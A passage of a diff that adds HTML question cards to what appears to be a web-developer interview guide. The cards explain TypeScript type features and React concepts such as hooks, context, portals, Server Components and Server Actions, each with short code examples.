+                    <strong>any:</strong> "I don't care about the type" (disables type checking).
+                    <strong>unknown:</strong> "I don't know the type yet" (must check before using).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><code>unknown</code> is the type-safe counterpart of <code>any</code>. You cannot perform
+                        operations on an <code>unknown</code> value without first narrowing its type (e.g., using
+                        <code>typeof</code>).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>let a: any = 10;
+a.foo(); // No Error (Runtime Crash)
+
+let u: unknown = 10;
+// u.foo(); // Error: Object is of type 'unknown'
+
+if (typeof u === 'number') {
+  console.log(u.toFixed(2)); // OK
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. Union vs Intersection -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. Union (`|`) vs Intersection (`&`) Types?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Union:</strong> A value can be one of several types (OR). <strong>Intersection:</strong> A
+                    value must satisfy multiple types (AND).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Unions are used for values that can vary (e.g., <code>string | null</code>). Intersections are
+                        used to combine existing types into a new one.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Union (OR)
+type Status = 'success' | 'error';
+
+// Intersection (AND)
+type Draggable = { drag: () => void };
+type Resizable = { resize: () => void };
+type Widget = Draggable & Resizable; // Must have both methods</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. keyof and typeof -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. Explain `keyof` and `typeof`.</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>typeof:</strong> Gets the type of a value/variable. <strong>keyof:</strong> Gets a union of
+                    all keys (property names) of a type.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They are often used together to create dynamic types based on existing objects.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const user = { name: 'Alice', age: 30 };
+
+type User = typeof user; // { name: string; age: number }
+type UserKeys = keyof User; // "name" | "age"</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. Utility Types -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. Common Utility Types (Pick, Omit, Partial)?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Built-in tools to transform types. <strong>Partial:</strong> Makes all props optional.
+                    <strong>Pick:</strong> Selects specific props. <strong>Omit:</strong> Removes specific props.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>These help avoid code duplication by deriving new types from existing ones.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>interface Todo {
+  title: string;
+  desc: string;
+  completed: boolean;
+}
+
+type MiniTodo = Pick&lt;Todo, 'title' | 'completed'&gt;;
+type NewTodo = Omit&lt;Todo, 'completed'&gt;;
+type UpdateTodo = Partial&lt;Todo&gt;; // All optional</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. Type Guards -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. What are Type Guards?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Techniques to narrow down the type of a variable within a conditional block.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Common guards include <code>typeof</code>, <code>instanceof</code>, and custom "type predicate"
+                        functions (functions returning <code>arg is Type</code>).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>function isString(val: unknown): val is string {
+  return typeof val === 'string';
+}
+
+function process(val: unknown) {
+  if (isString(val)) {
+    console.log(val.toUpperCase()); // TS knows val is string here
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. Discriminated Unions -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. What is a Discriminated Union?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A pattern where every type in a union has a common literal property (the "tag") which TypeScript
+                    uses to narrow the type.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>This is the standard way to handle polymorphic data in Redux actions or state management.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>interface Circle { kind: 'circle'; radius: number; }
+interface Square { kind: 'square'; side: number; }
+type Shape = Circle | Square;
+
+function getArea(s: Shape) {
+  if (s.kind === 'circle') {
+    return Math.PI * s.radius ** 2; // TS knows it's Circle
+  }
+  return s.side * s.side; // TS knows it's Square
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 9. Mapped Types -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">9. What are Mapped Types?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A way to create a new type by iterating over the keys of an existing type.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They are like <code>.map()</code> for types. You can add/remove modifiers like
+                        <code>readonly</code> or <code>?</code> (optional).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>type ReadOnly&lt;T&gt; = {
+  readonly [K in keyof T]: T[K];
+};
+
+type User = { name: string; age: number };
+type ReadOnlyUser = ReadOnly&lt;User&gt;; 
+// { readonly name: string; readonly age: number; }</code></pre>
+                </div>
+            </div>
+
+            <!-- 10. const Assertions -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. What is a `const` assertion?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A way to tell TypeScript that an expression should be treated as a literal, immutable value, not a
+                    general type.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It makes arrays <code>readonly</code> tuples and object properties <code>readonly</code>
+                        literals.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const config = {
+  endpoint: 'https://api.com',
+  retries: 3
+} as const;
+
+// config.endpoint is type "https://api.com" (not string)
+// config.retries is type 3 (not number)
+// config is readonly</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- React Section -->
+        <section id="react" class="chapter">
+            <h2 class="chapter-title">React</h2>
+
+            <!-- 1. Virtual DOM -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. What is the Virtual DOM?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A lightweight copy of the actual DOM in memory. React uses it to optimize updates.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>When state changes, React creates a new Virtual DOM tree. It compares this new tree with the
+                        previous one (Diffing Algorithm) and calculates the minimum number of changes required to update
+                        the real DOM (Reconciliation).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// React Element (Virtual DOM)
+const element = {
+  type: 'h1',
+  props: { children: 'Hello World' }
+};
+
+// React compares this object with the previous one
+// and updates the real DOM only if they differ.</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. JSX -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. What is JSX?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    JSX (JavaScript XML) is a syntax extension for JavaScript that allows you to write HTML-like code
+                    inside JavaScript.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Browsers cannot read JSX. It must be transpiled (usually by Babel) into standard JavaScript
+                        <code>React.createElement()</code> calls.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// JSX
+const element = &lt;h1&gt;Hello&lt;/h1&gt;;
+
+// Transpiled to JS
+const element = React.createElement('h1', null, 'Hello');</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. Class vs Functional -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. Difference between Class and Functional Components?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Class:</strong> Uses ES6 classes, `this`, and lifecycle methods.
+                    <strong>Functional:</strong> Plain functions using Hooks for state/effects.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Functional components are the modern standard. They are more concise, easier to test, and avoid
+                        common pitfalls with `this` binding.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Class Component
+class Welcome extends React.Component {
+  render() { return &lt;h1&gt;Hello, {this.props.name}&lt;/h1&gt;; }
+}
+
+// Functional Component
+function Welcome(props) {
+  return &lt;h1&gt;Hello, {props.name}&lt;/h1&gt;;
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. State vs Props -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. Difference between State and Props?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Props:</strong> Read-only data passed <em>into</em> a component (like function arguments).
+                    <strong>State:</strong> Mutable data managed <em>within</em> a component (like local variables).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Props allow parent-to-child communication. State allows a component to change its own data over
+                        time and trigger re-renders.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Parent passes props
+&lt;User name="Alice" /&gt;
+
+// Child uses props and manages own state
+function User(props) {
+  const [active, setActive] = useState(false); // State
+  return (
+    &lt;div&gt;
+      {props.name} is {active ? 'Active' : 'Inactive'}
+    &lt;/div&gt;
+  );
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. Lifecycle Methods -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. What are the React Lifecycle Phases?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Mounting</strong> (Birth), <strong>Updating</strong> (Growth), and
+                    <strong>Unmounting</strong> (Death).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>In functional components, we use the `useEffect` hook to handle these phases.</p>
+                    <ul>
+                        <li><strong>Mounting:</strong> <code>useEffect(..., [])</code></li>
+                        <li><strong>Updating:</strong> <code>useEffect(..., [dep])</code></li>
+                        <li><strong>Unmounting:</strong> <code>useEffect(() => cleanup, ...)</code></li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>useEffect(() => {
+  console.log("Mounted");
+
+  return () => {
+    console.log("Unmounted");
+  };
+}, []); // Empty array = run once on mount</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. useState -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. Explain the useState Hook.</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A Hook that lets you add React state to functional components.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It returns a pair: the current state value and a function that lets you update it. Updating state
+                        triggers a re-render.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const [count, setCount] = useState(0);
+
+// Update state (triggers re-render)
+setCount(count + 1);
+
+// Functional update (safer for multiple updates)
+setCount(prev => prev + 1);</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. useEffect -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. Explain the useEffect Hook.</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Used for side effects: fetching data, directly updating the DOM, and timers.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It runs after every render by default. You can control when it runs using the dependency array.
+                    </p>
+                </div>
+                <div class="code-example">
+                    <pre><code>useEffect(() => {
+  // Runs on mount + when 'userId' changes
+  fetchData(userId);
+}, [userId]); 
+
+useEffect(() => {
+  // Runs only on mount
+}, []);</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. useContext -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. What is the Context API?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A way to share values (global state) between components without explicitly passing props through
+                    every level of the tree (Prop Drilling).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Commonly used for theme, current user, or language settings.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// 1. Create Context
+const ThemeContext = createContext('light');
+
+// 2. Provide Value
+&lt;ThemeContext.Provider value="dark"&gt;
+  &lt;Toolbar /&gt;
+&lt;/ThemeContext.Provider&gt;
+
+// 3. Consume Value
+const theme = useContext(ThemeContext); // "dark"</code></pre>
+                </div>
+            </div>
+
+            <!-- 9. useRef -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">9. What is useRef used for?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Used to access DOM elements directly OR to store a mutable value that persists across renders
+                    <strong>without</strong> causing a re-render.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It returns a mutable ref object whose <code>.current</code> property is initialized to the passed
+                        argument.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const inputRef = useRef(null);
+
+const focusInput = () => {
+  // Access DOM node directly
+  inputRef.current.focus();
+};
+
+return &lt;input ref={inputRef} /&gt;;</code></pre>
+                </div>
+            </div>
+
+            <!-- 10. useMemo vs useCallback -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. Difference between useMemo and useCallback?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>useMemo:</strong> Caches a calculated <em>value</em>. <strong>useCallback:</strong> Caches a
+                    <em>function definition</em>.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Both are used for performance optimization to prevent unnecessary re-computations or re-renders
+                        of child components (when used with <code>React.memo</code>).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Returns a memoized value
+const expensiveValue = useMemo(() => compute(a, b), [a, b]);
+
+// Returns a memoized function
+const handleClick = useCallback(() => {
+  doSomething(a);
+}, [a]);</code></pre>
+                </div>
+            </div>
+
+            <!-- 11. Custom Hooks -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">11. What are Custom Hooks?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    JavaScript functions that start with "use" and can call other hooks. They allow you to extract and
+                    reuse stateful logic between components.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They follow the same rules as standard hooks. Common use cases include fetching data, handling
+                        local storage, or managing window events.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Custom Hook
+function useWindowWidth() {
+  const [width, setWidth] = useState(window.innerWidth);
+  useEffect(() => {
+    const handleResize = () => setWidth(window.innerWidth);
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize);
+  }, []);
+  return width;
+}
+
+// Usage
+const width = useWindowWidth();</code></pre>
+                </div>
+            </div>
+
+            <!-- 12. Context vs Redux -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">12. When to use Context API vs Redux?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Context:</strong> Low-frequency updates (Theme, User, Locale). Built-in.
+                    <strong>Redux:</strong> High-frequency updates, complex state logic, or when you need
+                    middleware/devtools.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Context can cause performance issues if not used carefully (re-renders all consumers). Redux is
+                        optimized for performance and scalability.</p>
+                </div>
+            </div>
+
+            <!-- 13. Prop Drilling -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">13. What is Prop Drilling?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    The process of passing data from a parent component down to a deep child component through
+                    intermediate components that do not need the data.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It makes code harder to maintain. Solved by using Context API, Redux, or Component Composition.
+                    </p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Prop Drilling
+&lt;App user={user} /&gt;
+  &lt;Layout user={user} /&gt; // Doesn't use user
+    &lt;Header user={user} /&gt; // Doesn't use user
+      &lt;Avatar user={user} /&gt; // Finally uses user</code></pre>
+                </div>
+            </div>
+
+            <!-- 14. Error Boundaries -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">14. What are Error Boundaries?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    React components that catch JavaScript errors anywhere in their child component tree, log those
+                    errors, and display a fallback UI.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They must be Class Components implementing <code>static getDerivedStateFromError()</code> or
+                        <code>componentDidCatch()</code>. They do not catch errors in event handlers or async code.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>class ErrorBoundary extends React.Component {
+  state = { hasError: false };
+  static getDerivedStateFromError(error) {
+    return { hasError: true };
+  }
+  render() {
+    if (this.state.hasError) return &lt;h1&gt;Something went wrong.&lt;/h1&gt;;
+    return this.props.children;
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 15. Fragments -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">15. What are Fragments?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A way to group a list of children without adding extra nodes (like extra `div`s) to the DOM.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Useful for returning multiple elements from a component or maintaining valid HTML structure
+                        (e.g., in tables or lists).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Short syntax
+&lt;&gt;
+  &lt;ChildA /&gt;
+  &lt;ChildB /&gt;
+&lt;/&gt;
+
+// Full syntax (supports keys)
+&lt;React.Fragment key={id}&gt;
+  ...
+&lt;/React.Fragment&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 16. Portals -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">16. What are Portals?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A way to render children into a DOM node that exists outside the DOM hierarchy of the parent
+                    component.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Commonly used for modals, tooltips, and popups to avoid z-index or overflow issues.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>ReactDOM.createPortal(
+  &lt;div&gt;I am outside the root!&lt;/div&gt;,
+  document.getElementById('modal-root')
+);</code></pre>
+                </div>
+            </div>
+
+            <!-- 17. Controlled vs Uncontrolled -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">17. Controlled vs Uncontrolled Components?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Controlled:</strong> Form data is handled by React state. <strong>Uncontrolled:</strong>
+                    Form data is handled by the DOM itself (using refs).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Controlled components are recommended as they support instant validation and conditional
+                        disabling. Uncontrolled are closer to traditional HTML.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Controlled
+&lt;input value={name} onChange={e => setName(e.target.value)} /&gt;
+
+// Uncontrolled
+&lt;input ref={inputRef} /&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 18. Higher-Order Components (HOC) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">18. What is a Higher-Order Component (HOC)?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A function that takes a component and returns a new component with enhanced functionality.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It's a pattern for reusing component logic (e.g., authentication, logging). Hooks have largely
+                        replaced HOCs.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>function withAuth(Component) {
+  return function WrappedComponent(props) {
+    if (!props.isAuthenticated) return &lt;Login /&gt;;
+    return &lt;Component {...props} /&gt;;
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 19. Render Props -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">19. What is the Render Props pattern?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A technique for sharing code between components using a prop whose value is a function.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>The component calls the prop function to determine what to render. Also largely replaced by
+                        Hooks.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>&lt;DataProvider render={data => (
+  &lt;h1&gt;Hello {data.target}&lt;/h1&gt;
+)} /&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 20. React.memo -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">20. What is React.memo?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A Higher-Order Component for memoizing functional components. It prevents re-renders if the props
+                    haven't changed.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It performs a shallow comparison of props. You can provide a custom comparison function as a
+                        second argument.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const MyComponent = React.memo(function MyComponent(props) {
+  /* render using props */
+});</code></pre>
+                </div>
+            </div>
+
+            <!-- 21. useReducer -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">21. Explain the useReducer Hook.</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    An alternative to `useState` for managing complex state logic involving multiple sub-values or when
+                    the next state depends on the previous one.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It works similarly to Redux reducers: <code>(state, action) => newState</code>.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>const [state, dispatch] = useReducer(reducer, initialState);
+
+dispatch({ type: 'increment' });</code></pre>
+                </div>
+            </div>
+
+            <!-- 22. SSR vs CSR -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">22. Difference between SSR and CSR?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>CSR (Client-Side Rendering):</strong> Browser downloads empty HTML + JS bundle, then renders
+                    content. <strong>SSR (Server-Side Rendering):</strong> Server sends fully rendered HTML.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>SSR is better for SEO and initial load performance (FCP). CSR provides a smoother interaction
+                        after the initial load.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// CSR (Standard React)
+&lt;div id="root"&gt;&lt;/div&gt;
+&lt;script src="bundle.js"&gt;&lt;/script&gt; // Renders content later
+
+// SSR (Next.js / Remix)
+&lt;div id="root"&gt;&lt;h1&gt;Hello&lt;/h1&gt;&lt;/div&gt; // Content arrives immediately</code></pre>
+                </div>
+            </div>
+
+            <!-- 23. Next.js -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">23. Why use Next.js?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Next.js is a React framework that provides SSR, Static Site Generation (SSG), file-based routing,
+                    and API routes out of the box.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It solves the configuration headache of setting up SSR manually with React and provides
+                        optimizations like Image and Font optimization.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// app/page.tsx (Next.js App Router)
+export default function Page() {
+  return &lt;h1&gt;Hello, Next.js!&lt;/h1&gt;;
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 24. Testing -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">24. How do you test React components?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Commonly using <strong>Jest</strong> (test runner) and <strong>React Testing Library</strong>
+                    (rendering and interaction).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>React Testing Library encourages testing behavior (what the user sees) rather than implementation
+                        details (state/props).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>import { render, screen } from '@testing-library/react';
+import App from './App';
+
+test('renders learn react link', () => {
+  render(&lt;App /&gt;);
+  const linkElement = screen.getByText(/learn react/i);
+  expect(linkElement).toBeInTheDocument();
+});</code></pre>
+                </div>
+            </div>
+
+            <!-- 25. Key Prop -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">25. Why is the `key` prop important in lists?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Keys help React identify which items have changed, are added, or are removed.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Using indexes as keys is discouraged if the list can be reordered, as it can lead to performance
+                        issues and bugs with component state.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Good
+{items.map(item => (
+  &lt;li key={item.id}&gt;{item.name}&lt;/li&gt;
+))}
+
+// Bad (if list changes order)
+{items.map((item, index) => (
+  &lt;li key={index}&gt;{item.name}&lt;/li&gt;
+))}</code></pre>
+                </div>
+            </div>
+
+            <!-- 26. React Server Components (RSC) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">26. What are React Server Components (RSC)?</h3>
+                    <span class="badge advanced">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Components that render exclusively on the server. They reduce bundle size and allow direct backend
+                    access.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Unlike SSR (which hydrates on the client), RSC code is <strong>never</strong> sent to the client.
+                        This allows you to keep large dependencies (like markdown parsers or database clients) on the
+                        server.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Server Component (default in Next.js App Router)
+import db from './db';
+
+async function UserList() {
+  const users = await db.query('SELECT * FROM users');
+  return (
+    &lt;ul&gt;
+      {users.map(user => &lt;li key={user.id}&gt;{user.name}&lt;/li&gt;)}
+    &lt;/ul&gt;
+  );
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 27. Server Actions -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">27. What are Server Actions?</h3>
+                    <span class="badge advanced">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Async functions that run on the server but can be called directly from Client Components (e.g., in
+                    form submissions).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They simplify data mutation by eliminating the need to manually create API endpoints for every
+                        form submission. They integrate with `useFormStatus` and `useFormState`.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Server Action
+async function createTodo(formData) {
+  'use server';
+  await db.todo.create({ title: formData.get('title') });
+}
+
+// Usage in Component
+&lt;form action={createTodo}&gt;
+  &lt;input name="title" /&gt;
+  &lt;button&gt;Add&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 28. React Compiler -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">28. What is the React Compiler (React Forget)?</h3>
+                    <span class="badge advanced">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    An automatic optimization tool that memoizes components and values at build time.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It aims to eliminate the need to manually use `useMemo` and `useCallback` by automatically
+                        understanding the dependency graph of your application.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Before (Manual Optimization)
+const value = useMemo(() => compute(a), [a]);
+
+// After (React Compiler)
+const value = compute(a); // Compiler auto-memoizes this!</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Next.js Section -->
+        <section id="nextjs" class="chapter">
+            <h2 class="chapter-title">Next.js</h2>
+
